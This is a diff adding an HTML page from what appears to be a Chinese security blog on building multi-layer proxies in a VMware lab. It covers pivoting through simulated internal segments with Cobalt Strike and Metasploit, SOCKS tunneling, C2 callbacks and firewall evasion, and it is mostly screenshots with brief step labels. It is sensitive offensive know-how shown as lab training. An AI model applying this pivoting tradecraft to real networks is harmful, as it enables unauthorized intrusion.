@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="代理 NAT        139.0模拟出网段 vmware2    2.0 模拟内网段1 vmware3    3.0 模拟内网段2 vmware4    4.0 模拟内网段3      服务器需要把网卡2，3，4全部禁用 cs演示 上线  代理  建立节点  注意端口是cs服务器端口 然后代理服务器  选4a扩展  测试一下  再加规则   测试成功  这个时候在攻击机win上fscan一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="多层代理搭建">
+<meta property="og:url" content="https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="代理 NAT        139.0模拟出网段 vmware2    2.0 模拟内网段1 vmware3    3.0 模拟内网段2 vmware4    4.0 模拟内网段3      服务器需要把网卡2，3，4全部禁用 cs演示 上线  代理  建立节点  注意端口是cs服务器端口 然后代理服务器  选4a扩展  测试一下  再加规则   测试成功  这个时候在攻击机win上fscan一下">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734597391301-ac95713a-2f99-4b91-8409-1f64d33d30fe.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734597978005-f727b176-c021-4545-aa52-05acb2da6765.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598064353-94352ced-4af6-4e63-822a-1313d6f82e25.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598092118-2d1bc42a-ca41-4ea6-99ee-66756d6cbf82.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598096983-bfdd30d4-e973-4d93-b742-52c713dd1891.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598101499-a9b79041-61d0-464c-8fa1-8f098dadbd1b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614811566-ac2a9254-43f3-4fef-bf15-93ddc98142a6.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612073706-d94e2943-110f-42f9-8a2a-599879f86e0a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614855176-a830e504-b486-440c-8188-c10d28782a45.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614866336-3dd78c9a-7b24-4492-80f8-819403627ed9.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612305228-2ac125e2-0372-471d-9785-c805929ac90f.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614953855-ca5d29c6-9164-4177-bc3e-9f4176809892.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614969731-8fd92125-3478-43de-8a92-317e7b9c845d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612549574-0b085cb1-400e-4e18-a90d-e03cc0efdb83.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734615005316-051de770-2f6a-4231-9388-208b2bbd2dbc.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612811637-bc50caec-f473-409f-9292-bd35bab8ed02.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734615081496-ebe95fa7-bc8e-4f15-b385-fd545fd27ecb.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616003616-e4603ac7-4a0d-4abf-a50c-376f1e26fa46.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616034675-7b1a3e99-30a5-47ac-a0b5-4c18daa023f4.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616389453-8bb0c833-b9f0-4664-a031-c699ddc690b6.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616603320-93ed0c06-197e-4045-a093-3516b4d54da8.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616670409-6291dd85-1e84-48c4-96fd-f78b456c3003.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734616691591-2265172d-08c0-4ebc-b48d-1bde4f7451ba.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617230971-8319e350-1271-4016-baf6-b56fb5a6e9ea.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617267483-d3c43f8e-18af-49de-8573-16936cebd216.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617302027-75a0e459-221c-44b4-bbf7-cce596ae57f1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734617388779-3b1f8323-ffd8-4558-a3d8-4c79735eaf26.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618095091-1fdf9d21-8ab0-45ec-8b9e-dbafeaffbcbe.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618208549-c93a9757-2794-49fd-adbb-01a076e59d61.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618258339-4b7a43d9-f093-4bd4-82de-8a892d89db53.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618361704-e51ec4d8-e9ec-4950-818e-1c9bc45d96dd.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734618846346-eb6cc5b8-a647-490f-80fd-a412260fe218.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750098640-8cd02866-23f4-44b0-a6bb-813b38439318.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750758111-764dbce3-bfe2-4765-8399-3b013439d0d1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734750955349-24d3b6b9-3917-4d3a-a65e-b19eb5904141.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751067472-f4e0de94-29ad-4601-bfd4-beee7dd694db.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751104085-1291c6be-4e5b-4817-a297-bb6cebabf7ed.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751699344-267f2b77-094b-4099-a63b-ddec156d034e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751588615-c218bf9d-ef2f-4a7a-8eb1-c52561519683.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751155888-ded59b85-a070-45f3-a47e-3e9159089d5e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751372819-00a56ca6-d302-4e35-be1a-b5522528798d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751386773-c633237c-d0f5-4129-82fc-43e22d6cdd79.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751425674-154c14b8-4ac5-4064-8e72-756f56ae4be8.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734751938613-0c33a4ab-adae-4ad5-af07-2f27af08d38d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752140181-0f13faf7-3ba1-4c5b-917a-b7e46d9dbff7.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752332292-83297104-3015-4e39-b6e3-00160500a56e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752529164-5d23a7d4-c89e-460b-bfa1-f67135aaaa3a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752728636-85c9205b-86fa-4f49-9d3f-df4fbc59db72.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734752825727-062fa586-c3a8-43de-94ef-0fceb221fe9e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753072321-60f39b33-daf7-40e8-9ee4-d789cfaeb258.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753109377-51cb82ea-fd7f-452e-8541-320ffaeb7940.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753163289-543a97f2-d179-46ff-988f-5c3615893c6d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753326387-7897dcd2-1a8c-41eb-8e95-2940e3dbb76e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753459262-2aa835fe-215d-4ff7-b947-fbae4f8f91fa.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753839783-a9a7b599-778f-4a18-9da9-109adecd4159.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734753905250-ba4a8a0c-ecb7-4762-a163-49072f3c6356.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754057908-aacbe4aa-4b2f-4ace-817b-67e32618b690.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754042506-3924a55e-efc6-4d3a-bd8b-20f02f0e7063.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754107964-950347ef-5386-473c-a5d8-fe00df8211fe.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734754329683-27a4f6e3-d4b7-4cf6-9b3b-82959fc9403a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734755548263-b9db2142-8a8f-4e88-b54e-f6c91ad6141f.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734768803502-aab59ed0-9d7a-4b0e-b422-e74eb2333609.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734768793189-4b0eab75-a95d-408d-8f8c-9435de96db0f.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770686286-a22a5e28-7b1e-4811-a860-0bf4d6000785.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770783583-242f228f-0b98-48ee-9908-c903367e620a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734770845216-7383e853-e345-41cc-9464-cc4ddda06faa.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771145479-35177ec4-3f01-459e-880f-bcb39de47f1a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771408616-1e293ad7-8f9d-4bcd-94fd-47f58c953cc3.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771786168-c23e77b4-ea6b-4bb9-92ca-a91663bcd3cd.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771865213-f5fdd4df-6d86-45e3-9dd5-1c01ffdc2e07.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734771968145-0ebe75a6-68b0-4e59-84d5-5a604ad83cc1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772200601-4dccb3f4-d2b8-4a61-84f8-aa532bb575ff.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772247956-2fdc01c9-aee3-41ca-9378-7a89315fb25c.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734772327920-3eef69f6-02a2-4a2c-8cbd-089fbd657049.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734773244500-dbab805e-0793-4fad-864b-43e1b87f5f73.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734773373028-5c999943-8224-45ca-90a4-1266822b1f56.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734961544506-d07eeec5-ca89-4283-bfe8-63b35017a736.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734963840046-6c95890d-2cd7-4c63-a9e7-267f59f5bda3.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734964118032-63f3404b-7f27-4044-bcc8-6f3b0be7a28d.png">
+<meta property="article:published_time" content="2024-10-04T14:51:29.000Z">
+<meta property="article:modified_time" content="2025-03-04T03:33:09.092Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="域">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734597391301-ac95713a-2f99-4b91-8409-1f64d33d30fe.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>多层代理搭建</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/10/08/%E5%86%85%E7%BD%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/10/03/%E5%9F%9F/%E5%9F%9F%E5%9F%BA%E7%A1%80/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&text=多层代理搭建"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&title=多层代理搭建"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&is_video=false&description=多层代理搭建"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=多层代理搭建&body=Check out this article: https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&title=多层代理搭建"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&title=多层代理搭建"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&title=多层代理搭建"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&title=多层代理搭建"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&name=多层代理搭建&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&t=多层代理搭建"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E6%BC%94%E7%A4%BA"><span class="toc-number">1.1.</span> <span class="toc-text">cs演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.</span> <span class="toc-text">msf演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SockS%E9%85%8D%E7%BD%AE-%E7%BD%91%E7%BB%9C%E4%B8%8D%E5%8F%AF%E8%BE%BE-%E9%80%9A%E8%AE%AF%E8%A7%A3%E5%86%B3"><span class="toc-number">1.3.</span> <span class="toc-text">SockS配置-网络不可达-通讯解决</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proxifier%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">Proxifier使用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Proxychains%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="toc-number">1.3.2.</span> <span class="toc-text">Proxychains使用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%8F%8D%E5%90%91%E7%9B%91%E5%90%AC-%E7%BD%91%E7%BB%9C%E4%B8%8D%E5%8F%AF%E8%BE%BE-C2%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.4.</span> <span class="toc-text">正反向监听-网络不可达-C2上线</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E5%8F%8D%E5%90%91%E4%B8%8A%E7%BA%BF%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">配置反向上线：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%B7%AF%E7%94%B1%E8%A1%A8%EF%BC%9A"><span class="toc-number">1.4.2.</span> <span class="toc-text">查看路由表：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAsocks%E8%8A%82%E7%82%B9%EF%BC%9A"><span class="toc-number">1.4.3.</span> <span class="toc-text">创建socks节点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%AD%A3%E5%90%91%E4%B8%8A%E7%BA%BF%EF%BC%9A"><span class="toc-number">1.4.4.</span> <span class="toc-text">配置正向上线：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">2.</span> <span class="toc-text">防火墙</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E7%AB%99%E9%99%90%E5%88%B6%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">入站限制：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BA%E7%AB%99%E9%99%90%E5%88%B6%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">出站限制：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%B1%82%E8%B7%B3%E6%9D%BF%E6%9C%BA%E9%98%B2%E7%81%AB%E5%A2%99%E5%BC%80%E5%90%AF%E4%B8%8A%E7%BA%BF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">单层跳板机防火墙开启上线解决方案：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%B1%82%E9%98%B2%E7%81%AB%E5%A2%99%E5%BC%80%E5%90%AF%E4%B8%8A%E7%BA%BF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-number">2.4.</span> <span class="toc-text">双层防火墙开启上线解决方案：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">2.5.</span> <span class="toc-text">域防火墙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%87%BA%E7%BD%91%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.6.</span> <span class="toc-text">如何判断目标服务器出网协议</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        多层代理搭建
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-04T14:51:29.000Z" class="dt-published" itemprop="datePublished">2024-10-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734597391301-ac95713a-2f99-4b91-8409-1f64d33d30fe.png"></p>
+<p>NAT        139.0模拟出网段</p>
+<p>vmware2    2.0 模拟内网段1</p>
+<p>vmware3    3.0 模拟内网段2</p>
+<p>vmware4    4.0 模拟内网段3</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734597978005-f727b176-c021-4545-aa52-05acb2da6765.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598064353-94352ced-4af6-4e63-822a-1313d6f82e25.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598092118-2d1bc42a-ca41-4ea6-99ee-66756d6cbf82.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598096983-bfdd30d4-e973-4d93-b742-52c713dd1891.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734598101499-a9b79041-61d0-464c-8fa1-8f098dadbd1b.png"></p>
+<p>服务器需要把网卡2，3，4全部禁用</p>
+<h3 id="cs演示"><a href="#cs演示" class="headerlink" title="cs演示"></a>cs演示</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614811566-ac2a9254-43f3-4fef-bf15-93ddc98142a6.png"></p>
+<p>上线</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734612073706-d94e2943-110f-42f9-8a2a-599879f86e0a.png"></p>
+<p>代理</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734614855176-a830e504-b486-440c-8188-c10d28782a45.png"></p>
+<p>建立节点</p>
